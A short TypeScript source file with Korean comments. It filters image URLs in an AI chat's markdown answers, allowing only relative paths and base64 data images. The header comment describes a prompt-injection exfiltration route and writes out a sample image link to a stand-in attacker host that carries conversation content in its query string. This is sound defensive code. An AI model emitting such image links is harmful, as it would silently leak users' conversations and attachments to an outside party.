// lib/ai-chat/image-src.ts — AI 답변 마크다운의 이미지 주소 판정
//
// 위협: 답변에 `![](https://공격자/?q=대화내용)` 이 섞이면 브라우저가 그리는 순간 그 주소를 부른다.
//   누르지 않아도 나가므로 프롬프트 주입 하나로 대화와 첨부 내용이 바깥으로 샌다.
// 그래서 자기 출처(상대 경로)와 data:image 만 그리고 나머지는 그리지 않는다.

const DATA_IMAGE = /^data:image\/(png|jpe?g|gif|webp|avif);base64,/i

/** 그려도 되는 이미지 주소인가 */
export function isSafeImageSrc(src: unknown): src is string {
  if (typeof src !== 'string') return false
  const s = src.trim()
  if (s === '') return false
  if (DATA_IMAGE.test(s)) return true
  // 상대 경로만, `//host` 와 `/\host` 는 바깥 주소다
  return s.startsWith('/') && !s.startsWith('//') && !s.startsWith('/\\')
}
